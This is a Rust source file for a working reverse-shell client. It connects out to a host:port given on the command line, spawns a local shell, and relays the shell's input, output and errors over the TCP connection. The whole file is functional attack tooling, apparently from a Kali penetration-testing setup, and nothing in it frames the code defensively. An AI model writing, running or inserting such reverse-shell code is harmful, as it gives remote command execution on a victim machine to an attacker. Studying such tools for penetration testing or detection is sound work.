use chrono::prelude::*;
use std::io::{self, ErrorKind, Read, Write};
use std::net::SocketAddr;
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::sync::Mutex;
use std::thread;
use std::time::Duration;
use std::{env, process};

fn main() -> io::Result<()> {
    let shell = remote_pty::get_shell_path()?;
    if let Some(host) = env::args().nth(1) {
        if let Ok(addr) = host.parse::<SocketAddr>() {
            match TcpStream::connect(&addr) {
                Ok(stream) => {
                    if let Ok(mut child) = Command::new(shell)
                        .current_dir("/home/kali/Desktop")
                        .stdin(Stdio::piped())
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .spawn()
                    {
                        if let Err(e) = stream.set_nodelay(true) {
                            eprintln!("${e}");
                        }
                        if let Err(e) = stream.set_nonblocking(true) {
                            eprintln!("${e}");
                        }
                        if let Err(e) = stream.set_read_timeout(None) {
                            eprintln!("${e}");
                        }
                        if let Err(e) = stream.set_write_timeout(Some(Duration::from_secs(10))) {
                            eprintln!("${e}");
                        }

                        let stream = Arc::new(Mutex::new(stream));

                        let mut c_in = child.stdin.take().unwrap();
                        let mut c_out = child.stdout.take().unwrap();
                        let mut c_err = child.stderr.take().unwrap();

                        let stream1 = Arc::clone(&stream);
                        thread::spawn(move || {
                            //io::copy(&mut reader, &mut c_in);

                            // 1. Read from peer stream.
                            let mut input = [0u8; 4096];

                            loop {
                                match stream1.lock().unwrap().read(&mut input) {
                                    Ok(size) => {
                                        println!("{:?}", Local::now());
                                        if size == 0 {
                                            break;
                                        }

                                        // 2. Write to shell
                                        if let Err(e) = c_in.write(&input[0..size]) {
                                            eprintln!("write to shell err:{:?}", e);
                                            process::exit(0);
                                        }
                                    }
                                    Err(e) => {
                                        if e.kind() != ErrorKind::WouldBlock {
                                            let local: DateTime<Local> = Local::now();
                                            println!("{:?}", local);
                                            eprintln!("read from peer err:{:?}", e);
                                            process::exit(0);
                                        }
                                    }
                                }
                                thread::sleep(Duration::from_millis(10));
                            }
                        });

                        let stream2 = Arc::clone(&stream);
                        thread::spawn(move || {
                            let mut tmp = [0u8; 4096];
                            loop {
                                // 3. Read from stdout of shell
                                match c_out.read(&mut tmp) {
                                    Ok(size) => {
                                        if size > 0 {
                                            println!(
                                                "read from shell({})=>{:?}",
                                                size,
                                                String::from_utf8_lossy(&tmp[0..size])
                                            );

                                            match stream2.lock().unwrap().write(&tmp[0..size]) {
                                                Ok(size) => {
                                                    println!("write to peer({})", size);
                                                }
                                                Err(e) => {
                                                    eprintln!(
                                                        "[{:?}] write to peer err:{:?}",
                                                        Local::now(),
                                                        e
                                                    );
                                                    if e.kind() != ErrorKind::WouldBlock {
                                                        process::exit(0);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    Err(e) => {
                                        eprintln!("read from shell err:{:?}", e);
                                        process::exit(0);
                                    }
                                }
                                thread::sleep(Duration::from_millis(10));
                            }
                        });
                        let stream3 = Arc::clone(&stream);
                        thread::spawn(move || {
                            let mut tmp = [0u8; 4096];
                            loop {
                                // 4. Read from stderr of shell
                                match c_err.read(&mut tmp) {
                                    Ok(size) => {
                                        if size > 0 {
                                            println!(
                                                "2Write to peer:{}=>{:?}",
                                                size,
                                                String::from_utf8_lossy(&tmp[0..size])
                                            );
                                            if let Err(e) =
                                                stream3.lock().unwrap().write_all(&tmp[0..size])
                                            {
                                                eprintln!("write to peer err2:{:?}", e);
                                                process::exit(0);
                                            }
                                        }
                                    }
                                    Err(e) => {
                                        eprintln!("read from stderr:{:?}", e);
                                        process::exit(0);
                                    }
                                }
                                thread::sleep(Duration::from_millis(10));
                            }
                        });

                        if let Err(e) = child.wait() {
                            eprintln!("wait err:{:?}", e);
                        } else {
                            let local: DateTime<Local> = Local::now();

                            println!("{:?} : Child has finished its execution!", local);
                        }
                    } else {
                    }
                }
                Err(e) => {
                    eprint!("{:?}", e);
                }
            }
        }
    }

    Ok(())
}
